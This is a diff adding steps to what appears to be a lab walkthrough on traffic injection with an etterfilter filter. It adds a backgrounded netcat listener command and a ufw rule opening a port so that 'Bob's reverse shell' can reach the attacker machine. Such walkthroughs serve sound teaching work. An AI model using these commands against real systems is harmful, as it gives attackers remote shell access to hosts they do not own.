@@ -833,6 +833,16 @@ if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
 
     - `etterfilter whoami.ecf -o whoami.ef `
 
+- Start your listener _(backgrounded)_. For the upper example above, you could use:
+
+    - `nc -nvlp 666 &`
+
+- **Not so fast!** If anything, we still need to allow the incoming connection through the **firewall**. 
+
+    - **Disable `ufw`** or create a corresponding allow rule; otherwise, Bob's reverse shell will be blocked by the firewall:
+    
+        - `ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 666 proto tcp`
+
 ---
 
 ![giphy](https://user-images.githubusercontent.com/94720207/166587250-292d9a9f-e590-4c25-a678-d457e2268e85.gif)
